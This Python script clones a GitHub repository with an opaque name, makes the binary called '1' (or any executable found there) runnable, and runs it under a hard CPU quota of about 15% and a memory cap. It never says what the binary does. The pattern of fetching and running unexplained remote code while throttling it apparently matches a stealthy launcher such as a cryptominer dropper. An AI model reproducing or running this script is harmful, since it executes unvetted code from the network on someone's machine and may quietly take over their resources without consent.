import os
import shutil
import subprocess
import sys

def run_command(command, cwd=None):
    try:
        result = subprocess.run(command, shell=True, cwd=cwd, check=True,
                                capture_output=True, text=True)
        print(f"✅ Command succeeded: {command}")
        if result.stdout:
            print(result.stdout)
        return True
    except subprocess.CalledProcessError as e:
        print(f"❌ Command failed: {command}")
        print(f"Error: {e.stderr}")
        return False

def build_run_command(binary, cpu_percent=15):
    """Return a command string that hard-caps CPU usage."""
    if shutil.which("systemd-run"):
        # Hard cgroup CPU quota: 15% of one CPU (Quota/Period)
        # CPUQuota=15% == 0.15 * 100000us per 100000us period
        return (
            f"systemd-run --scope --user "
            f"-p CPUQuota={cpu_percent}% "
            f"-p MemoryMax=2G "
            f"-- {binary}"
        )
    elif shutil.which("cpulimit"):
        # cpulimit throttles by SIGSTOP/SIGCONT — works on any binary
        return f"cpulimit --limit={cpu_percent} -- {binary}"
    elif shutil.which("taskset"):
        # Fallback: pin to a single core (≈ 1/N of total CPU)
        return f"taskset -c 0 {binary}"
    else:
        print("⚠️  No CPU limiter found (systemd-run / cpulimit / taskset).")
        print("    Install one, e.g.: sudo apt install cpulimit")
        return binary

def main():
    repo_url = "https://github.com/yynbid456/1.git"
    print(f"Cloning repository: {repo_url}")
    if not run_command(f"git clone {repo_url}"):
        sys.exit(1)

    repo_dir = "1"
    if not os.path.exists(repo_dir):
        print(f"❌ Directory '{repo_dir}' not found after cloning")
        sys.exit(1)

    print("Making file '1' executable...")
    if not run_command("chmod +x 1", cwd=repo_dir):
        sys.exit(1)

    # Detect the actual binary name (in case it's not literally "1")
    binary = "./1"
    if not os.path.exists(os.path.join(repo_dir, "1")):
        for name in os.listdir(repo_dir):
            full = os.path.join(repo_dir, name)
            if os.path.isfile(full) and os.access(full, os.X_OK):
                binary = f"./{name}"
                print(f"Using executable: {binary}")
                break

    run_cmd = build_run_command(binary, cpu_percent=15)
    print(f"Running with hard CPU cap:\n  {run_cmd}")
    print("-" * 50)

    # ulimit for memory still applies in the same shell; CPU is enforced by
    # systemd-run/cpulimit/taskset above, which the binary cannot ignore.
    if not run_command(f"ulimit -v 2000000; {run_cmd}", cwd=repo_dir):
        sys.exit(1)

    print("-" * 50)

if __name__ == "__main__":
    main()